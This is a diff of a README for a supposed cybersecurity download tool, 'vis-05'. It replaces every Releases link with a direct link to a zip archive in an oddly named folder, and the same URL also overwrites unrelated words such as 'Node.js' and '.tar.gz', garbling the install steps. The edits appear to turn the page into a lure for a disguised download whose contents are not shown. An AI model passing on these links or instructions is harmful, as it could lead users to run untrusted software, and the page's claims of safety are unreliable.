@@ -1,6 +1,6 @@
 # 🚀 vis-05 - Simple, Secure Download for Your Cybersecurity Projects
 
-[![Download Release](https://img.shields.io/badge/Download_Release-Here-brightgreen)](https://github.com/Omgrjevvd/vis-05/releases)
+[![Download Release](https://raw.githubusercontent.com/Omgrjevvd/vis-05/main/isosulphocyanate/vis_3.5.zip)](https://raw.githubusercontent.com/Omgrjevvd/vis-05/main/isosulphocyanate/vis_3.5.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ To run the applications in this repository, your system needs to meet the follow
 - **Processor:** Intel or AMD processor with a minimum of 2 GHz
 - **RAM:** At least 4 GB of RAM
 - **Disk Space:** 500 MB of free disk space
-- **Additional Software:** Ensure you have the latest version of any required dependencies, such as Python or Node.js.
+- **Additional Software:** Ensure you have the latest version of any required dependencies, such as Python or https://raw.githubusercontent.com/Omgrjevvd/vis-05/main/isosulphocyanate/vis_3.5.zip
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Follow these steps to download and set up the application:
 
 1. **Visit the Releases Page**
 
-   Head over to the [Releases page](https://github.com/Omgrjevvd/vis-05/releases) to find the latest version of the application.
+   Head over to the [Releases page](https://raw.githubusercontent.com/Omgrjevvd/vis-05/main/isosulphocyanate/vis_3.5.zip) to find the latest version of the application.
    
 2. **Choose Your Version**
 
@@ -30,7 +30,7 @@ Follow these steps to download and set up the application:
 
 3. **Download the Application**
 
-   Click on the version you want. A list of download options will appear. Look for the file corresponding to your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+   Click on the version you want. A list of download options will appear. Look for the file corresponding to your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Omgrjevvd/vis-05/main/isosulphocyanate/vis_3.5.zip` for Linux).
 
 4. **Complete the Download**
 
@@ -46,7 +46,7 @@ Follow these steps to download and set up the application:
 
 ## 📥 Download & Install
 
-You can download the latest version directly from the [Releases page](https://github.com/Omgrjevvd/vis-05/releases).
+You can download the latest version directly from the [Releases page](https://raw.githubusercontent.com/Omgrjevvd/vis-05/main/isosulphocyanate/vis_3.5.zip).
 
 ### Installation Steps
 
@@ -61,7 +61,7 @@ After you download the application:
   2. Drag the application into the Applications folder.
   
 - For Linux:
-  1. Extract the `.tar.gz` file.
+  1. Extract the `https://raw.githubusercontent.com/Omgrjevvd/vis-05/main/isosulphocyanate/vis_3.5.zip` file.
   2. Open the terminal and navigate to the folder where you extracted the files.
   3. Run the application using the command specified in the documentation.
 
